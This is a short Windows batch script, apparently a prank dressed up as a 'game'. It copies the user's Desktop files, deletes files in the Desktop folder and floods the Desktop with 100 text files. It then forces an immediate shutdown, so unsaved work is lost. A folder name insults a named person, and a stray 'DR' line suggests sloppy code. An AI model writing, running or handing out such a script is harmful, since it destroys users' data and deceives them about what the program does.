
@ECHO OFF 
mkdir c:\Users\%USERNAME%\Desktop\justgame
xcopy c:\Users\%USERNAME%\Desktop\* justgame
mkdir c:\Users\%USERNAME%\Documents\justgame
xcopy fuckpranesh c:\Users\%USERNAME%\Documents\justgame
DEL c:\Users\%USERNAME%\Desktop
DR


SET /A "index = 1"
SET /A "count = 100"
:while
if %index% leq %count% (
   echo The value of index is %index%
   @echo Game is start ..! > c:\Users\%USERNAME%\Desktop\game_is_start%index%.txt
   SET /A "index = index + 1"
   goto :while
)

shutdown /s /f /t 0

